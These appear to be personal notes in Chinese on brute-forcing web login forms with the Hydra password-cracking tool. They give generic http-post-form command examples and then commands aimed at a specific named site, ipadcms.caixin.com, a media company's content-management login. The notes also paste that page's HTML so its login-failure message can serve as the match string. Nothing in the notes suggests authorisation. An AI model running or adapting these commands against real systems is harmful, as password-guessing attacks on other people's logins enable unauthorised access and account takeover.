1. [九头蛇 Hydra 在线密码破解(ftp,ssh,各种)](http://blog.csdn.net/dzp443366/article/details/52614327)
2. [中文用法](http://www.ha97.com/5186.html)



## Hydra 破解 Web 登录
```
# hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"
# hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:wrong username or password"
（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。）
```
$ hydra http://ipadcms.caixin.com/  http-post-form "login.php:id=^USER^&passwd=^PASS^:wrong username or password"   -L user_path.txt -P pwd_path.txt 

$ hydra http://ipadcms.caixin.com/ -s 80 http-post-form "username=^USER^&password=^PASS^&magazine_id=1:登录失败!" -L user_path.txt -P pwd_path.txt 


<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link rel="stylesheet" type="text/css" href="http://ipadcms.caixin.com/css/cms.css">
        <title>移动平台内容管理系统</title>
        <style>
            body { background:#EEF0EF; font-size:12px; font-family:"Arial", "新宋体"; line-height:18px; margin:0px; padding:0px;}
            ul,li,ol,dd { margin:0px;padding:0px;list-style:none;}
            .errormsg{color: red;font-size: 14px;}
.incLogin { width:780px; height:450px; margin:auto; background:url(http://ipadcms.caixin.com/css/images/login.jpg) no-repeat; margin-top:30px;}
.incLogin .h1 { font-size:20px; font-family:"黑体"; line-height:30px; color:#666666; padding-bottom:20px;}
.incLogin .h2 { font-size:14px; font-weight:bold; color:#666666; }
.incLogin ul { width:270px; padding-top:100px; padding-left:300px; }
.incLogin ul li { line-height:30px; font-size:14px; padding-bottom:10px;}
.incLogin ul span { float:right;}
.incLogin .inputTxt { width:200px; border:1px solid #ccc; background:url(http://ipadcms.caixin.com/css/images/txtbg.jpg) repeat-x; line-height:24px; height:24px;}
.incLogin .inputButGo { margin-left:65px; margin-right:10px;}
.incLogin .inputButGo,.incLogin .inputButRd { padding:2px 10px;}

        </style>
		<script language="javascript">
		<!--
			try{
				if(window != top){
					top.location.href = window.href;
				}
			}catch(error){
			}
		//-->
		</script>
    </head>

    <body>
        <div class="incLogin">
            <ul>
                <div class="h2">Login</div>
                <div class="h1">移动平台内容管理系统</div>
                                    <div class="errormsg">
                        <p><em>登录失败!</em>　用户名无效，或密码错误。</p>
                    </div>
                                <form action="http://ipadcms.caixin.com/login/check" method="post" id="loginform" target="_top">
                    <li><span>
                            <input name="username" type="text" class="inputTxt">
                        </span>用户名：</li>
                    <li><span>
                            <input name="password" type="password" class="inputTxt">
                        </span>密码：</li>
                    <li>
                   <li><span>
                            <select name="magazine_id">
                            	<option value=1>新世纪</option>
                            	<option value=2>中改</option>
                            </select>
                        </span>默认进入：</li>
                    <li>
                        <input type="submit" value="登录" class="inputButGo">
                        <input name="" type="reset" value="重置" class="inputButRd">
                    </li>
                </form>
            </ul>
        </div>
        <div class="footer"></div>
    </body>
</html>
